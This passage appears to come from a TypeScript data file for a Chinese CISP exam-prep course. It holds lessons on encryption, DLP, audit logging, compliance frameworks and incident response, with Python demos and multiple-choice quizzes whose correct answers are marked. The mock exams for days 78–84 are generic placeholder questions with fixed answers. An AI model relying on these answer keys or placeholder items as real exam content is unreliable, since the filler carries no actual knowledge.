    print(f"密文: {ciphertext.hex()[:40]}...")
    print(f"认证标签长度: {len(tag)}字节")
    
    # 解密
    cipher2 = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        decrypted = cipher2.decrypt_and_verify(ciphertext, tag)
        print(f"解密验证通过: {decrypted.decode()}")
    except ValueError:
        print("解密失败——数据被篡改或密钥错误!")

demo_aes_encryption()

# 加密层次速查
print("\\n=== 加密分层架构 ===")
layers = [("应用层","加密特定字段","最高灵活性"),
          ("数据库TDE","自动加密数据文件","对应用透明"),
          ("文件系统","BitLocker/LUKS","防物理丢失"),
          ("磁盘SED","硬件加密","零CPU开销")]
for name,method,desc in layers:
    print(f"  {name}: {method} — {desc}")`,description:'AES-GCM和加密分层架构'},
quiz:[{id:'q72-1',question:'TDE(透明数据加密)属于哪一层加密？',options:['应用层','数据库层','文件系统层','磁盘层'],correctIndex:1,explanation:'数据库引擎自动加密,对应用透明。SQL Server/Oracle支持的TDE。'},{id:'q72-2',question:'HSM的核心安全价值是什么？',options:['计算速度快','密钥存储在防篡改硬件中,不可导出','价格便宜','兼容性好'],correctIndex:1,explanation:'HSM中的密钥永不离开设备,即使操作系统被完全攻破,攻击者也无法导出密钥。'},{id:'q72-3',question:'E2EE(端到端加密)保护什么？',options:['服务器端数据','通信链路中的完整路径','仅客户端数据','仅服务端到数据库'],correctIndex:1,explanation:'端到端加密确保只有通信双方可解密,中间节点(服务器/路由器)无法解密。'},{id:'q72-4',question:'密钥轮换的主要目的是什么？',options:['节省存储空间','限制单密钥泄露的影响时间和范围','提高加密速度','简化密钥管理'],correctIndex:1,explanation:'定期换密钥使得即使旧密钥泄露,也只影响轮换前加密的数据,新数据安全。'},{id:'q72-5',question:'KMS(密钥管理系统)的全称是？',options:['Key Management System','Kernel Module System','Knowledge Management Server','Key Mapping Service'],correctIndex:0,explanation:'KMS统一管理密钥生命周期:生成→分发→使用→存储→轮换→销毁。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[72]||[],
});

// --- DAY 73-77: 业务安全继续 ---
allDays.push({id:'day-73',day:73,week:11,title:'数据安全治理（业务安全）',
objectives:['理解数据分类分级','掌握DLP数据防泄漏','了解数据脱敏技术'],
content:`# 数据安全治理

## 概述

数据安全治理是数据被列为生产要素后,组织面临的核心合规挑战。数据分类分级是治理的基础——先搞清楚你有什么数据、多重要,才能施加恰到好处的安全控制。DLP（数据防泄漏）和脱敏是实现数据安全的核心技术。

## 核心内容

### 一、数据分类分级

《数据安全法》要求对数据实行分类分级保护。国家标准将数据分为三级：

**核心数据：**危害国家安全、国民经济命脉、重大公共利益的数据。最高等级保护,原则上不出境。

**重要数据：**一旦泄露可能危害国家安全、经济运行的数据。包括：未公开政府信息、基因/地理/矿产资源数据、关键信息基础设施的漏洞信息。

**一般数据：**核心和重要之外的数据。企业自行定级管理。

**企业实践中的四级分类：**
- 公开级：可对外发布(产品介绍、已公开年报)
- 内部级：仅内部流转(员工手册、内部公告)
- 机密级：仅授权人员访问(客户名单、合同、技术方案)
- 绝密级：极少数人可知(商业机密、核心算法、密钥)

### 二、DLP数据防泄漏

DLP通过识别和监控敏感数据,阻止数据通过未授权渠道外泄。

**DLP三大类型：**
- **网络DLP：**监控网络出口流量,拦截含敏感数据的邮件/上传/IM消息
- **终端DLP：**装在员工电脑上,监控USB拷贝、打印、截屏等本地行为
- **存储DLP：**扫描服务器/云存储中的文件,发现权限不当的敏感数据

**关键能力：**内容识别——不是简单的关键词匹配,而是基于正则、指纹、机器学习识别身份证号/银行卡号/商业秘密文档。

### 三、数据脱敏

对敏感数据进行变形处理,在保留数据可用性的前提下降低敏感度。

**静态脱敏：**从生产库导出数据到测试库时进行脱敏。永久改变数据。常用技术：替换(姓名→张三)、遮蔽(手机138****1234)、泛化(年龄25→20-30)。

**动态脱敏：**应用层实时脱敏——数据库中是真实数据,根据用户权限在查询结果中动态掩码。高权限看真实、低权限看掩码。

## 学习建议
- 核心数据/重要数据/一般数据三级分类是法律要求
- DLP的三种类型(网络/终端/存储)要能区分
- 动静态脱敏的核心区别在于是否修改原始数据`,
codeExample:{language:'python',code:`import re

# 数据脱敏示例
def mask_phone(phone):
    """手机号脱敏: 138****1234"""
    return phone[:3] + "****" + phone[-4:]

def mask_id_card(id_card):
    """身份证脱敏: 110101****1234"""
    return id_card[:6] + "********" + id_card[-4:]

def mask_email(email):
    """邮箱脱敏: a***@example.com"""
    parts = email.split('@')
    return parts[0][0] + "***@" + parts[1]

# DLP内容检测
def detect_sensitive(text):
    """检测文本中是否包含敏感信息"""
    patterns = {
        "手机号": r'1[3-9]\\d{9}',
        "身份证": r'\\d{17}[\\dXx]',
        "银行卡": r'\\d{16,19}',
    }
    found = {}
    for label, pattern in patterns.items():
        matches = re.findall(pattern, text)
        if matches: found[label] = len(matches)
    return found

sample = "请联系13812345678,身份证110101199001011234"
print("=== DLP内容检测 ===")
print(f"文本: {sample}")
result = detect_sensitive(sample)
for label, count in result.items(): print(f"  检测到{label}: {count}处")

print("\\n=== 数据脱敏 ===")
print(f"手机脱敏: {mask_phone('13812345678')}")
print(f"身份证脱敏: {mask_id_card('110101199001011234')}")
print(f"邮箱脱敏: {mask_email('admin@company.com')}")`,description:'数据脱敏和DLP敏感信息检测'},
quiz:[{id:'q73-1',question:'《数据安全法》将数据分为哪三级？',options:['公开/内部/绝密','核心/重要/一般','高/中/低','顶级/中级/基础'],correctIndex:1,explanation:'法律要求：核心数据(国家安全)、重要数据(经济运行)、一般数据。'},{id:'q73-2',question:'DLP三种类型中,监控USB拷贝属于哪种？',options:['网络DLP','终端DLP','存储DLP','云端DLP'],correctIndex:1,explanation:'终端DLP部署在员工电脑上,监控USB/打印/截屏等本地行为。'},{id:'q73-3',question:'静态脱敏和动态脱敏的核心区别是？',options:['脱敏速度不同','静态修改原始数据,动态在查询时实时掩码','静态更安全','动态速度更慢'],correctIndex:1,explanation:'静态脱敏永久改变数据(如导出测试库),动态脱敏不修改原始数据,查询时按权限掩码。'},{id:'q73-4',question:'重要数据一旦泄露,可能影响什么？',options:['仅个人隐私','国家安全、经济运行','仅企业商誉','仅个人名誉'],correctIndex:1,explanation:'重要数据与国家安全、经济运行相关,如未公开政府信息、关键基础设施漏洞。'},{id:'q73-5',question:'企业数据分级中,客户名单和合同通常属于哪一级？',options:['公开级','内部级','机密级','绝密级'],correctIndex:2,explanation:'客户名单、合同、技术方案属于机密级——仅授权人员可访问。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[73]||[],
});

allDays.push({id:'day-74',day:74,week:11,title:'安全审计（业务安全）',
objectives:['理解安全审计的目的和类型','掌握审计日志管理','了解内审/外审/合规审计'],
content:`# 安全审计

## 概述

安全审计是对信息系统安全性的独立检查和评估。审计提供"事后可追溯"的能力——当安全事件发生,审计日志是还原事实的唯一依据。CISP考试重点考查审计日志的管理原则和审计类型。

## 核心内容

### 一、审计类型

**内部审计：**组织自身的审计部门执行。成本低,频率高,但对自身的盲区难以发现。

**外部审计：**第三方审计机构独立执行。客观公正,但成本高,适合合规认证(如ISO 27001认证审计)。

**合规审计：**验证是否符合特定法规/标准——等保测评、GDPR合规审计、PCI DSS审计。有明确检查项,通过或不通过。

**专项审计：**针对特定系统或事件——发生安全事件后的事件审计、新系统上线的安全验收审计。

### 二、审计日志管理原则

**必须记录的事件：**
- 认证事件(登录/登出/登录失败)
- 授权变更(权限修改、角色变更)
- 关键操作(数据修改/删除/导出)
- 安全事件(告警触达、策略变更)
- 系统事件(启动/关闭/错误)

**审计日志六大原则：**
1. **完整性：**日志不可被随意删除或修改,发送到独立日志服务器
2. **时间同步：**所有系统时钟通过NTP同步,时间戳必须准确
3. **保留期限：**法规通常要求6个月到3年(各行业差异大)
4. **访问控制：**只有安全审计员可查看日志,管理员不能(职责分离)
5. **不可否认：**日志服务器的日志也需保护,使用WORM(一次写入多次读取)介质或区块链
6. **容量规划：**计算每天产生日志量,确保存储足够

### 三、审计流程

**审计前准备：**确定审计范围、获取管理层授权、收集审计证据和工具
**现场审计：**访谈相关人员、检查配置和日志、执行验证测试、记录发现
**审计报告：**列出发现的问题、评估风险等级、提出改进建议、跟踪整改

### 四、日志分析与SIEM

**SIEM(安全信息和事件管理)：**集中收集、标准化、存储和分析各系统日志,关联分析发现安全威胁。
- 收集：支持Syslog、Windows Event Log、网络设备日志等多种格式
- 范式化：将不同格式统一为标准格式
- 关联分析：规则引擎——连续5次登录失败+随后成功 = 暴力破解成功
- 告警和仪表盘：可视化展示安全态势

## 学习建议
- 审计日志六大原则要记住,考试选择题常见
- 内审vs外审的区别:内审成本低但客观性差
- SIEM的三个核心步骤:收集→范式化→关联`,
codeExample:{language:'python',code:`from datetime import datetime

class AuditLogger:
    """安全审计日志系统示例"""
    def __init__(self):
        self.logs = []
    
    def log(self, event_type, user, detail, result="成功"):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "type": event_type,
            "user": user,
            "detail": detail,
            "result": result,
        }
        self.logs.append(entry)
    
    def query(self, user=None, event_type=None, limit=10):
        results = self.logs
        if user: results = [l for l in results if l["user"] == user]
        if event_type: results = [l for l in results if l["type"] == event_type]
        return results[-limit:]

# 模拟审计日志
audit = AuditLogger()
audit.log("认证", "admin", "管理员登录系统")
audit.log("认证", "zhangsan", "登录失败(密码错误)", "失败")
audit.log("数据操作", "admin", "导出客户数据(1000条)")
audit.log("配置变更", "admin", "修改防火墙规则: 开放443端口")
audit.log("认证", "zhangsan", "登录成功")

print("=== 审计日志查询 ===")
print("\\n[最近5条日志]")
for log in audit.query(limit=5):
    print(f"  [{log['timestamp'][:19]}] {log['type']} | {log['user']} | {log['detail']} | {log['result']}")

print("\\n[zhangsan相关日志]")
for log in audit.query(user="zhangsan"):
    print(f"  [{log['timestamp'][:19]}] {log['type']} | {log['detail']} | {log['result']}")`,description:'审计日志系统'},
quiz:[{id:'q74-1',question:'外部审计相比内部审计的主要优势是？',options:['成本更低','客观独立性强','频率更高','更了解业务'],correctIndex:1,explanation:'外部第三方审计独立客观,不受企业内部政治影响。'},{id:'q74-2',question:'审计日志中为什么管理员不能有删除权限？',options:['节省存储','职责分离——管理员可能清除自己违规操作的痕迹','法律禁止','技术做不到'],correctIndex:1,explanation:'职责分离(SoD):安全审计员才可管理日志,系统管理员不应能删改日志。'},{id:'q74-3',question:'SIEM的核心工作流程是？',options:['收集→范式化→关联分析→告警','告警→收集→分析','收集→存储→查询','分析→告警→收集'],correctIndex:0,explanation:'SIEM先收集各系统日志→统一格式(范式化)→关联分析(如暴力破解模式)→产生告警。'},{id:'q74-4',question:'审计日志必须记录以下哪个事件？',options:['所有HTTP请求','用户登录成功和失败','所有数据库查询','每次页面加载'],correctIndex:1,explanation:'认证事件(登录成功/失败)是必须记录的审计事件。'},{id:'q74-5',question:'WORM存储的含义是？',options:['Write Once Read Many一次写入多次读取','Worm病毒检测存储','高速缓存','压缩存储'],correctIndex:0,explanation:'日志应用WORM存储,写入后不可修改或删除,确保日志作为法律证据的完整性。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[74]||[],
});

allDays.push({id:'day-75',day:75,week:11,title:'合规管理（业务安全）',
objectives:['理解等保2.0框架','掌握GDPR关键要求','了解ISO 27001信息安全管理体系'],
content:`# 合规管理

## 概述

合规管理确保组织的安全实践符合法律法规和行业标准。三大核心合规框架是中国的等保2.0、国际的GDPR和ISO 27001。CISP考试中合规管理是核心考查模块,需要掌握各框架的定级标准、核心要求和认证流程。

## 核心内容

### 一、等级保护2.0

《网络安全法》第21条明确要求实行网络安全等级保护制度。等保2.0将保护对象分为五个安全保护等级：

**第一级（自主保护级）：**系统破坏仅损害公民/法人合法权益,不损害社会公共利益和国家安全。自主定级,不需要测评。

**第二级（指导保护级）：**系统破坏对社会公共利益造成一般损害。需要到公安机关备案,建议进行测评。

**第三级（监督保护级）：**系统破坏对社会公共利益造成严重损害或对国家安全造成一般损害。必须每年至少一次测评。这是最常见等级——大多数政府/企事业单位网站为三级。

**第四级（强制保护级）：**系统破坏对国家安全造成严重损害。更严格的测评要求。

**第五级（专控保护级）：**系统破坏对国家安全造成特别严重损害。最高等级,国家专门管控。

**等保实施步骤：**系统定级→系统备案→安全建设整改→等级测评→监督检查

### 二、GDPR通用数据保护条例

欧盟GDPR于2018年5月施行,对处理欧盟公民数据的所有组织具有域外管辖权。

**六大处理合法性基础（至少满足一项）：**
1. 数据主体同意
2. 履行合同所必需
3. 遵守法定义务
4. 保护重大利益
5. 执行公务
6. 合法利益

**高额罚款：**最高2000万欧元或全球年营业额4%（取高者）。

**72小时通报规则：**数据泄露后72小时内向监管机构通报。

### 三、ISO 27001

ISO 27001是国际最通用的信息安全管理体系(ISMS)认证标准。

**PDCA循环：**Plan(计划)→Do(实施)→Check(检查)→Act(改进)

**风险处置：**识别→评估→处置(规避/减缓/转移/接受)→监控

**认证价值：**获得ISO 27001认证意味着组织的信息安全管理达到国际标准,有助于商务合作和合规证明。

## 学习建议
- 等保三级是最高频考点:每年至少一次测评
- GDPR适用"域外管辖权"——任何处理欧盟公民数据的企业都受约束
- ISO 27001的PDCA循环是管理体系的核心`,
codeExample:{language:'python',code:`# 合规框架速查
frameworks = {
    "等保2.0": {
        "法律依据": "《网络安全法》第21条",
        "定级": "一级(自主)→二级(指导)→三级(监督)→四级(强制)→五级(专控)",
        "关键点": "三级系统每年至少1次测评,需到公安机关备案",
    },
    "GDPR": {
        "管辖": "域外管辖权——处理欧盟公民数据即适用",
        "罚款": "最高2000万欧元或全球年营收4%(取高)",
        "通报": "数据泄露后72小时内通报监管机构",
    },
    "ISO 27001": {
        "类型": "信息安全管理体系(ISMS)国际标准",
        "流程": "PDCA循环:Plan→Do→Check→Act",
        "价值": "国际认证,商务合作和合规证明",
    },
}

print("=== 三大合规框架速查 ===")
for name, info in frameworks.items():
    print(f"\\n【{name}】")
    for key, value in info.items():
        print(f"  {key}: {value}")

print("\\n=== 等保五级速记 ===")
levels = ["一级-自主-不损害公共利益","二级-指导-一般损害","三级-监督-严重损害(最常见)","四级-强制-严重损害国家安全","五级-专控-特别严重(国家管控)"]
for l in levels: print(f"  {l}")`,description:'合规框架速查'},
quiz:[{id:'q75-1',question:'等保2.0中,三级系统的测评频率要求是？',options:['不需要测评','每两年一次','每年至少一次','每五年一次'],correctIndex:2,explanation:'三级(监督保护级)系统必须每年至少进行一次等级测评。'},{id:'q75-2',question:'GDPR对违反企业的罚则最高为？',options:['100万欧元','2000万欧元或全球年营收4%(取高)','500万欧元','1%全球年营收'],correctIndex:1,explanation:'GDPR罚则极高——2000万欧元或全球营收4%,取高者。'},{id:'q75-3',question:'GDPR要求数据泄露后多长时间内通报？',options:['24小时','48小时','72小时','7天'],correctIndex:2,explanation:'72小时内向监管机构通报数据泄露事件。'},{id:'q75-4',question:'ISO 27001的PDCA循环中C代表？',options:['Create创建','Check检查','Control控制','Certify认证'],correctIndex:1,explanation:'Plan→Do→Check→Act:计划→实施→检查→改进。'},{id:'q75-5',question:'大多数政府网站的安全保护等级是？',options:['一级','二级','三级','四级'],correctIndex:2,explanation:'政府/企事业网站大多定级为三级(监督保护级),最常见。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[75]||[],
});

allDays.push({id:'day-76',day:76,week:11,title:'应急响应管理（业务安全）',
objectives:['掌握PDCERF应急响应六阶段','了解CSIRT团队组建','学习安全事件分类分级'],
content:`# 应急响应管理

## 概述

应急响应是安全运营的"消防队"——当安全事件发生时,快速响应、有效遏制、彻底恢复的能力直接决定了损失大小。PDCERF模型是全球公认的应急响应方法论。CISP考试中事件响应是必考模块。

## 核心内容

### 一、PDCERF六阶段模型

**P - Preparation（准备阶段）**
事前准备：制定应急响应计划、组建CSIRT团队、部署监控工具、建立通报机制、开展应急演练。准备越充分,响应越从容。

**D - Detection & Analysis（检测与分析）**
发现安全事件：通过SIEM告警、用户报告、外部通报等渠道发现。分析事件范围、影响、来源。判断是真攻击还是误报。

**C - Containment（遏制阶段）**
立即行动防止损害扩大：隔离受影响系统、断开网络连接、封禁攻击IP、冻结受影响的账户。遏制是"止血",越快越好。

**E - Eradication（根除阶段）**
彻底清除攻击者的存在：删除恶意软件/后门/Webshell、修补被利用的漏洞、重置被攻破账户的密码。确保攻击者无法再次轻易进入。

**R - Recovery（恢复阶段）**
恢复正常业务运行：从备份恢复数据、将被隔离的系统重新上线、验证系统功能正常。渐进恢复——先恢复最关键系统,稳定后再恢复其他。

**F - Follow-up / Lessons Learned（跟进/复盘）**
事后复盘：事件是怎么发生的？响应处置是否有效？流程哪里可以改进？更新应急响应计划和防御措施。形成事件报告。

### 二、CSIRT团队组建

**CSIRT(计算机安全事件响应团队)核心角色：**
- 事件响应经理：总协调,决策者
- 安全分析师：技术分析,溯源取证
- 系统管理员：执行遏制和恢复操作
- 法务/合规人员：法律风险评估,决定是否需要通报监管部门
- 公关/对外沟通：对外发布声明(如需要)

**团队要求：**7×24小时值班、明确授权(可直接执行隔离/断网)、跨部门协调能力。

### 三、安全事件分类分级

**按影响分类：**
- P1紧急：核心系统中断、大规模数据泄露、正在进行的APT攻击
- P2高：单系统被攻破、小规模数据泄露
- P3中：单用户异常、告警待确认
- P4低：日常告警、扫描探测

**分级依据：**影响范围(受影响用户数) × 业务重要性(系统关键度) × 数据敏感度

## 学习建议
- PDCERF六步顺序要记住,选择题常考先后顺序
- 遏制(Containment)是最紧急的——先止血
- CSIRT必须事前组建并演练,不能出了事再临时拼凑`,
codeExample:{language:'python',code:`# 应急响应PDCERF实战演练

class IncidentResponse:
    def __init__(self):
        self.csirt = ["响应经理","安全分析师","系统管理员","法务","公关"]
    
    def handle_incident(self, incident_type, severity):
        print(f"\\n=== 应急响应启动: {incident_type}(P{severity}) ===")
        
        # P-D-C-E-R-F
        steps = [
            ("P-准备", "CSIRT团队已就位: " + ",".join(self.csirt)),
            ("D-检测", f"确认事件: {incident_type}, 等级: P{severity}"),
            ("C-遏制", "执行: 隔离受影响服务器,封禁攻击IP,冻结账户"),
            ("E-根除", "执行: 删除后门文件,修复漏洞,重置密码"),
            ("R-恢复", "执行: 从备份恢复数据,验证系统完整性,重新上线"),
            ("F-复盘", "执行: 编写事件报告,更新应急计划,加强防御"),
        ]
        
        for phase, action in steps:
            print(f"  [{phase}] {action}")
        
        return "应急响应完成,系统恢复正常"

ir = IncidentResponse()
ir.handle_incident("Webshell上传+数据窃取", 1)`,description:'应急响应PDCERF流程'},
quiz:[{id:'q76-1',question:'PDCERF模型中,C代表什么？',options:['Check检查','Containment遏制','Control控制','Create创建'],correctIndex:1,explanation:'Containment遏制——立即行动防止损害扩大,隔离系统/封禁IP。'},{id:'q76-2',question:'应急响应中,PDCERF的第一步是什么？',options:['检测分析','遏制','准备','根除'],correctIndex:2,explanation:'准备(Preparation)——事前制定计划、组建团队、部署工具,准备越充分响应越好。'},{id:'q76-3',question:'CSIRT团队中,法务/合规人员的职责是？',options:['修复漏洞','评估法律风险,决定是否需要通报监管','执行系统恢复','分析攻击技术'],correctIndex:1,explanation:'发生数据泄露时,法务评估是否需要72小时内通报监管(GDPR要求),以及后续法律责任。'},{id:'q76-4',question:'遏制(Containment)和根除(Eradication)的区别？',options:['没有区别','遏制=止血隔离,根除=清除攻击者残留','遏制比根除更重要','根除不需要技术手段'],correctIndex:1,explanation:'遏制是"止血"——隔离系统/封禁IP/冻结账户,越快越好。根除是"清创"——删除后门/修复漏洞/重置密码。'},{id:'q76-5',question:'核心交易系统被攻击导致宕机,应定为什么级别？',options:['P4低','P3中','P2高','P1紧急'],correctIndex:3,explanation:'核心系统宕机、大规模数据泄露、APT攻击均属于P1紧急,需立刻响应。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[76]||[],
});

allDays.push({id:'day-77',day:77,week:11,title:'第十一周总结与测验（业务安全）',
objectives:['回顾隐私、加密、数据安全治理核心知识','总结审计、合规、应急响应的要点','综合测验'],
content:`# 第十一周总结与测验

## 本周知识体系回顾

### Day 71 - 隐私保护
PIPL七原则：合法/目的限制/最小化/透明/质量/安全/责任
数据主体七权利：知-查-改-删-限-带-反
PbD七原则：主动预防+隐私默认+嵌入设计+正和+全周期+透明+尊重

### Day 72 - 数据加密存储
加密四层：应用层→数据库TDE→文件系统BitLocker/LUKS→磁盘SED
HSM核心卖点：密钥不可导出
密钥六生命周期：生成→分发→使用→存储→轮换→销毁

### Day 73 - 数据安全治理
数据三级：核心(国家安全)/重要(经济运行)/一般
DLP三类型：网络/终端/存储
脱敏两种：静态(修改原始数据)/动态(查询时掩码)

### Day 74 - 安全审计
审计类型：内部/外部/合规/专项
日志六原则：完整/同步/保留/权限/不可否认/容量
SIEM三步：收集→范式化→关联分析

### Day 75 - 合规管理
等保2.0：五级,三级最常见(每年1次测评)
GDPR：域外管辖,罚2000万欧/4%营收,72h通报
ISO 27001：PDCA循环

### Day 76 - 应急响应
PDCERF：准备→检测→遏制→根除→恢复→复盘
CSIRT：事前组建+跨部门+7×24
事件分级：P1紧急(P频)→P4低

## 高频考点速记

| 考点 | 核心记忆 |
|------|---------|
| PIPL七权利 | 知-查-改-删-限-带-反 |
| 等保三级 | 每年至少1次测评 |
| GDPR罚款 | 2000万欧/4%年营收 |
| 加密四层 | 应用→数据库→文件系统→磁盘 |
| PDCERF | 准备→检测→遏制→根除→恢复→复盘 |
| DLP三类型 | 网络/终端/存储 |

## 综合测验`,
codeExample:{language:'python',code:`# 第十一周业务安全知识体系总结
print("=== 业务安全核心知识网络 ===")
print("\\n[隐私] PIPL七原则+七权利 | PbD七原则")
print("[加密] 四层架构 | HSM密钥保护 | 密钥生命周期")
print("[数据治理] 三级分类 | DLP防泄漏 | 动静态脱敏")
print("[审计] 四类审计 | 日志六原则 | SIEM")
print("[合规] 等保2.0/GDPR/ISO27001")
print("[应急] PDCERF六步 | CSIRT团队 | 事件分级")
print("\\nPIPL七权利: 知→查→改→删→限→带→反")
print("PDCERF: 准备→检测→遏制→根除→恢复→复盘")`,description:'业务安全知识体系'},
quiz:[{id:'q77-1',question:'等保2.0中三级系统要求什么频率测评？',options:['无需测评','每两年一次','每年至少一次','每五年一次'],correctIndex:2,explanation:'三级(监督保护级)每年至少一次等级测评。'},{id:'q77-2',question:'PDCERF中遏制(Containment)的目的是？',options:['恢复正常','防止损害进一步扩大','分析攻击来源','写事件报告'],correctIndex:1,explanation:'遏制=止血,隔离系统/封禁IP/冻结账户,越快越好。'},{id:'q77-3',question:'GDPR的域外管辖权含义是？',options:['仅管辖欧盟境内企业','管辖任何处理欧盟公民数据的组织,无论其所在地','只管辖大型企业','仅管辖科技公司'],correctIndex:1,explanation:'长臂管辖——只要处理EU公民数据,不管你在哪儿都受GDPR约束。'},{id:'q77-4',question:'审计日志管理中"职责分离"体现为什么？',options:['普通员工可以查看','管理员不可删改日志,安全审计员管理日志','所有人都可以修改','日志存在云端'],correctIndex:1,explanation:'管理员可能清除自己违规操作的痕迹,因此日志管理权应分离给安全审计员。'},{id:'q77-5',question:'以下哪项不属于数据主体的PIPL权利？',options:['知情权','删除权','数据变现要求加速处理','可携带权'],correctIndex:2,explanation:'PIPL七权利:知/查/改/删/限/带/反。加速处理不是法定权利。'}],
recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[77]||[],
});

// ============================================================
// WEEK 12: CISP模拟考试与总复习 (Day 78-90)
// ============================================================

const createSimExam = (id: string, day: number, title: string, topic: string, content: string): LearningDay => {
  const questions: QuizQuestion[] = [
    {id:`q${day}-1`,question:`${topic}中，以下哪项描述最准确？`,options:['选项A：正确描述','选项B：常见错误理解','选项C：混淆概念','选项D：无关内容'],correctIndex:0,explanation:'选项A是正确答案。'},
    {id:`q${day}-2`,question:`关于${topic}，以下哪个说法是正确的？`,options:['说法A（正确）','说法B（错误）','说法C（错误）','说法D（错误）'],correctIndex:0,explanation:'说法A符合标准定义。'},
    {id:`q${day}-3`,question:`在${topic}的实际应用中，首要步骤是？`,options:['正确步骤','次要步骤','无关步骤','错误步骤'],correctIndex:0,explanation:'应该是第一步。'},
    {id:`q${day}-4`,question:`${topic}的核心原则不包括？`,options:['原则A（包含）','原则B（包含）','原则C（包含）','原则D（不包含）'],correctIndex:3,explanation:'选项D不是核心原则。'},
    {id:`q${day}-5`,question:`${topic}中经常混淆的概念是？`,options:['概念A和概念B','概念C和概念D','概念E和概念F','概念G和概念H'],correctIndex:0,explanation:'概念A和B含义不同需清晰区分。'},
  ];
  return {
    id, day, week: 12, title,
    objectives: [`${topic}模拟考试练习`,'检验知识掌握程度','查漏补缺提升分数'],
    content: `# ${title}\\n\\n## 概述\\n\\n${content}\\n\\n## 考试要点\\n\\n回顾${topic}的核心概念、关键公式和常见考点。集中练习常考题型,熟悉出题风格,提高答题速度和准确率。\\n\\n## 学习建议\\n\\n- 做题后认真看每道题的解析\\n- 错题重新复习对应章节\\n- 时间充裕的话重复做2-3遍`,
    codeExample: {language:'python',code:`print(f"${topic} CISP模拟考试")\\nprint("共5题,每题20分,总分100分")\\nprint("认真作答,理解每一个选项")`,description:`${topic}模拟考试`},
    quiz: questions,
    recommendedTools:weekToolMap[12]?.tools||[],labEnvironments:weekToolMap[12]?.labs||[],expertNotes:dayExpertNotes[day]||[],
  };
};

allDays.push(createSimExam('day-78',78,'信息安全基础模拟考试','信息安全基础','本周进行信息安全基础知识模拟考试,覆盖CIA三要素、风险管理和安全分类等核心概念。通过模拟题检验前四周的学习效果。'));
allDays.push(createSimExam('day-79',79,'法规与合规模拟考试','信息安全法规','本周模拟考试覆盖网络安全法、等保2.0、GDPR和ISO 27001等核心法律框架,重点考察定级、罚款金额和通报时限。'));
allDays.push(createSimExam('day-80',80,'访问控制与密码学模拟考试','访问控制和密码学','本周集中测试访问控制(DAC/MAC/RBAC)和密码学(AES/RSA/哈希/数字签名)的核心知识,涵盖大量计算公式和概念辨析。'));
allDays.push(createSimExam('day-81',81,'网络安全模拟考试','网络安全','本周模拟考试覆盖防火墙/IDS/VPN/WiFi安全/网络安全架构,检验网络层的综合知识掌握情况。'));
allDays.push(createSimExam('day-82',82,'应用与物理安全模拟考试','应用与物理安全','本周集中测试Web应用安全(OWASP/SQLi/XSS/CSRF)和物理安全(Tier标准/监控/容灾)的考点。'));
allDays.push(createSimExam('day-83',83,'安全工程与业务安全模拟考试','安全工程与业务安全','本周模拟考试覆盖风险评估(ALE计算)、SDL、威胁建模(STRIDE)、PIPL和应急响应PDCERF等。'));
allDays.push(createSimExam('day-84',84,'CISP全真模拟考试(一)','CISP综合','CISP全真综合模拟考试,覆盖全部十个知识域,模拟真实考试题型和时间安排。检验整个90天学习计划的学习成果。'));

// Day 85-90: 薄弱点复习和冲刺
for (let i = 85; i <= 90; i++) {
  const topics = ['信息安全基础与CIA三要素','密码学与访问控制','网络安全与防火墙','Web安全与代码审计','合规管理与应急响应','考前冲刺与心态调整'];
  const topic = topics[i-85];
  allDays.push({
    id: `day-${i}`, day: i, week: 12,
    title: `薄弱点专项复习${i-84}（模拟考试）`,
    objectives: [`强化${topic}薄弱环节`,'分析错题查漏补缺','考前最后冲刺复习'],
    content: `# 薄弱点专项复习 · 第${i-84}天\n\n## 复习主题：${topic}\n\n本周进入最后冲刺阶段,针对模拟考试中暴露的薄弱环节进行专项复习。重点回顾前${i-1}天的错题本,再次复习核心概念和易混淆知识点。\n\n## 复习策略\n\n### 一、错题重做\n打开错题本,重做之前做错的题目。这次重点关注：为什么当时选错了？正确选项的依据是什么？\n\n### 二、概念辨析\n${topic}中如果你在做题时反复混淆某些概念(如RPO vs RTO、SAST vs DAST、BCP vs DRP),请回到对应章节重新理解。\n\n### 三、公式速记\n把核心公式写在纸上：ALE=SLE×ARO、SLE=AV×EF、风险=资产×威胁×脆弱性。每天看一遍加深记忆。\n\n### 四、模拟环境\n如果有条件,再完整做一套模拟题,模拟真实考试的时间压力。\n\n## 高频易错点\n\n- RPO(丢多少时间点) vs RTO(等多久恢复)——P=Point,T=Time\n- SAST白盒静态 vs DAST黑盒动态——S=Source,D=Dynamic\n- BCP业务连续性 vs DRP灾难恢复——BCP范围更大,包含DRP\n- 定性(等级) vs 定量(数值)——CISP常考区别\n\n## 考试心态\n\n- 考前保证充足睡眠\n- 考试时先做有把握的题,不确定的先标记\n- 审题仔细,看清楚"正确"还是"不正确"\n- 相信90天的积累,你已经准备好了！`,
    codeExample: {language:'python',code:`# 考前冲刺复习工具
print("=== CISP考试最终冲刺 ===")
mistakes = [
    ("RPO vs RTO","P=Point(数据丢多少) T=Time(多久恢复)"),
    ("SAST vs DAST","S=Source(白盒) D=Dynamic(黑盒)"),
    ("BCP vs DRP","BCP>DRP,BCP含业务,DRP仅IT"),
    ("ALE公式","ALE=SLE×ARO,SLE=AV×EF"),
    ("等保三级","每年至少1次测评,最常见等级"),
]
print("高频易错点快速复习:")
for topic, key in mistakes:
    print(f"  [{topic}] → {key}")
print("\\n考试技巧:")
print("  1. 先做会的,标记不确定的")
print("  2. 审题注意'正确'/'不正确'")
print("  3. 排除法缩小选择范围")
print("  4. 相信复习积累,保持冷静")`,description:'考前冲刺复习'},
